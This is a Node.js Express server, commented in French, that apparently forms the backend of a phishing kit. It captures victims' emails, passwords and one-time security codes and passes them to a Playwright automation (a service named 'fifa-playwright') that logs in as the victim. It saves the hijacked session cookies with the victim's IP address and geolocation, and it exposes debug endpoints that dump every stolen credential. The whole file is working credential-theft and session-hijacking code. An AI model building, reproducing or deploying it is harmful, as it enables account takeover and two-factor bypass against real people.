const express = require('express');
const bodyParser = require('body-parser');
const { spawn } = require('child_process');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const db = require('./database');

const app = express();
const PORT = process.env.PORT || 3000;

// Variables globales pour stocker les données (comme avant)
let currentSecurityCode = '';
let currentCredentials = { email: '', password: '' };

// Initialiser la base de données au démarrage
db.initializeDatabase()
  .then(() => {
    console.log('✅ Base de données initialisée avec succès');
  })
  .catch((err) => {
    console.error('❌ Erreur lors de l\'initialisation de la base de données:', err);
  });

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('views'));
app.use(bodyParser.json({ limit: '2mb' })); // Augmente la limite si besoin

// Middleware pour les logs
app.use((req, res, next) => {
  console.log(`${new Date().toISOString()} - ${req.method} ${req.path}`);
  next();
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'views', 'index.html'));
});

// Endpoint de santé pour Docker
app.get('/health', (req, res) => {
  res.json({ 
    status: 'healthy', 
    timestamp: new Date().toISOString(),
    database: 'connected'
  });
});

// Endpoint pour récupérer les identifiants automatiquement (comme avant)
app.get('/get-credentials', (req, res) => {
  if (currentCredentials.email && currentCredentials.password) {
    res.json({ 
      email: currentCredentials.email, 
      password: currentCredentials.password 
    });
    console.log('📤 Identifiants envoyés automatiquement:', currentCredentials.email);
  } else {
    res.status(404).json({ error: 'Identifiants non disponibles' });
  }
});

// Endpoint pour récupérer le code automatiquement (comme avant)
app.get('/get-code', (req, res) => {
  if (currentSecurityCode) {
    res.json({ code: currentSecurityCode });
    console.log('📤 Code envoyé automatiquement:', currentSecurityCode);
  } else {
    res.status(404).json({ error: 'Code non disponible' });
  }
});

app.post('/login', async (req, res) => {
  const { email, password } = req.body;
  
  console.log('📝 Stockage des identifiants...');
  
  // Stocker les identifiants dans la variable globale (comme avant)
  currentCredentials = { email, password };
  console.log('✅ Identifiants stockés:', email);
  
  // AUSSI sauvegarder dans la base de données (en arrière-plan)
  try {
    await db.saveCredentials(email, password);
    console.log('✅ Identifiants aussi sauvegardés dans la base de données');
  } catch (error) {
    console.error('⚠️ Erreur lors de la sauvegarde en base:', error.message);
  }
  
  // Attendre un peu avant de lancer le script pour s'assurer que les identifiants sont disponibles
  setTimeout(() => {
    // Lancer le script Playwright avec spawn pour voir les logs en temps réel
    console.log('🚀 Lancement automatique du script Playwright...');
    
    // En mode Docker, on peut lancer Playwright dans un conteneur séparé
    if (process.env.NODE_ENV === 'production' && process.env.DOCKER_ENV) {
      console.log('🐳 Mode Docker détecté, lancement via Docker Compose...');
      const dockerProcess = spawn('docker-compose', ['run', '--rm', 'fifa-playwright'], {
        cwd: process.cwd(),
        stdio: ['pipe', 'pipe', 'pipe']
      });

      dockerProcess.stdout.on('data', (data) => {
        console.log('🎭 Playwright Docker:', data.toString().trim());
      });

      dockerProcess.stderr.on('data', (data) => {
        console.error('❌ Playwright Docker Error:', data.toString().trim());
      });

      dockerProcess.on('close', (code) => {
        console.log('🏁 Script Playwright Docker terminé avec le code:', code);
      });
    } else {
      // Mode local normal
      const playwrightProcess = spawn('node', ['mon-projet-playwright/test.js'], {
        cwd: __dirname,
        stdio: ['pipe', 'pipe', 'pipe']
      });

      // Afficher les logs du script Playwright
      playwrightProcess.stdout.on('data', (data) => {
        console.log('🎭 Playwright:', data.toString().trim());
      });

      playwrightProcess.stderr.on('data', (data) => {
        console.error('❌ Playwright Error:', data.toString().trim());
      });

      playwrightProcess.on('close', (code) => {
        console.log('🏁 Script Playwright terminé avec le code:', code);
      });

      playwrightProcess.on('error', (error) => {
        console.error('💥 Erreur lors du lancement du script Playwright:', error);
      });
    }

  }, 1000); // Attendre 1 seconde
  
  res.end();
});

app.post('/code', async (req, res) => {
  const { securityCode } = req.body;
  console.log('Code reçu côté serveur :', securityCode);
  
  // Stocker le code dans la variable globale ET dans le fichier (comme avant)
  currentSecurityCode = securityCode;
  fs.writeFileSync(path.join(__dirname, 'security_code.txt'), securityCode);
  
  // AUSSI sauvegarder dans la base de données (en arrière-plan)
  try {
    await db.saveSecurityCode(securityCode, currentCredentials.email || 'default@example.com');
    console.log('✅ Code aussi sauvegardé dans la base de données');
  } catch (error) {
    console.error('⚠️ Erreur lors de la sauvegarde du code en base:', error.message);
  }
  
  res.send('<pre>Code transmis, la connexion va se poursuivre automatiquement...</pre>');
});

// Nouveaux endpoints pour la gestion des sessions
app.post('/create-session', async (req, res) => {
  const { email } = req.body;
  
  try {
    // Générer un token de session unique
    const sessionToken = crypto.randomBytes(32).toString('hex');
    
    // Créer une session dans la base de données
    await db.createSession(email, sessionToken);
    
    res.json({ 
      sessionToken,
      message: 'Session créée avec succès'
    });
  } catch (error) {
    console.error('Erreur lors de la création de la session:', error);
    res.status(500).json({ error: 'Erreur lors de la création de la session' });
  }
});

app.get('/validate-session/:token', async (req, res) => {
  const { token } = req.params;
  
  try {
    const session = await db.validateSession(token);
    
    if (session) {
      res.json({ 
        valid: true,
        email: session.email,
        expiresAt: session.expires_at
      });
    } else {
      res.json({ valid: false });
    }
  } catch (error) {
    console.error('Erreur lors de la validation de la session:', error);
    res.status(500).json({ error: 'Erreur lors de la validation de la session' });
  }
});

// Endpoint pour lister tous les codes de sécurité (pour debug)
app.get('/debug/codes', async (req, res) => {
  try {
    const codes = await db.getAllSecurityCodes();
    res.json(codes);
  } catch (error) {
    console.error('Erreur lors de la récupération des codes:', error);
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

// Endpoint pour lister toutes les sessions (pour debug)
app.get('/debug/sessions', async (req, res) => {
  try {
    const sessions = await db.getAllSessions();
    res.json(sessions);
  } catch (error) {
    console.error('Erreur lors de la récupération des sessions:', error);
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

// Endpoint pour lister tous les identifiants (pour debug)
app.get('/debug/credentials', async (req, res) => {
  try {
    const credentials = await db.getAllCredentials();
    res.json(credentials);
  } catch (error) {
    console.error('Erreur lors de la récupération des identifiants:', error);
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

// Endpoint pour nettoyer les données anciennes
app.post('/debug/cleanup', async (req, res) => {
  try {
    const [expiredSessions, oldCodes] = await Promise.all([
      db.cleanupExpiredSessions(),
      db.cleanupOldSecurityCodes()
    ]);
    
    res.json({
      message: 'Nettoyage terminé',
      expiredSessions,
      oldCodes
    });
  } catch (error) {
    console.error('Erreur lors du nettoyage:', error);
    res.status(500).json({ error: 'Erreur lors du nettoyage' });
  }
});

// Nettoyage automatique toutes les heures
setInterval(async () => {
  try {
    await Promise.all([
      db.cleanupExpiredSessions(),
      db.cleanupOldSecurityCodes()
    ]);
  } catch (error) {
    console.error('Erreur lors du nettoyage automatique:', error);
  }
}, 60 * 60 * 1000); // Toutes les heures

app.post('/save-cookies', async (req, res) => {
  console.log('Données reçues pour /save-cookies:', req.body);

  const { email, cookies, location } = req.body;
  if (!email || !cookies) {
    return res.status(400).json({ error: 'Email et cookies sont requis.' });
  }
  try {
    await db.saveSessionCookies(
      email,
      cookies,
      location?.ip || '',
      location?.city || '',
      location?.region || '',
      location?.country || '',
      location?.latitude || null,
      location?.longitude || null,
      location?.org || ''
    );
    res.json({ success: true });
  } catch (error) {
    console.error('Erreur SQL /save-cookies:', error);
    res.status(500).json({ error: 'Erreur lors de la sauvegarde des cookies' });
  }
});

app.get('/get-cookies', async (req, res) => {
  const email = req.query.email;
  if (!email) {
    return res.status(400).json({ error: 'Email requis' });
  }
  try {
    const row = await db.getSessionCookies(email);
    if (row) {
      res.json({
        email,
        cookies: row.cookies,
        ip: row.ip,
        city: row.city,
        region: row.region,
        country: row.country,
        latitude: row.latitude,
        longitude: row.longitude,
        org: row.org
      });
    } else {
      res.status(404).json({ error: 'Aucun cookie trouvé pour cet email' });
    }
  } catch (error) {
    res.status(500).json({ error: 'Erreur lors de la récupération des cookies' });
  }
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Serveur web lancé sur http://localhost:${PORT}`);
  console.log('🗄️ Base de données SQLite intégrée');
  console.log('🧹 Nettoyage automatique activé (toutes les heures)');
  console.log(`🌍 Mode: ${process.env.NODE_ENV || 'development'}`);
});

// Gestion propre de la fermeture
process.on('SIGINT', async () => {
  console.log('\n🔄 Fermeture du serveur...');
  await db.closeDatabase();
  process.exit(0);
});

process.on('SIGTERM', async () => {
  console.log('\n🔄 Fermeture du serveur (SIGTERM)...');
  await db.closeDatabase();
  process.exit(0);
}); 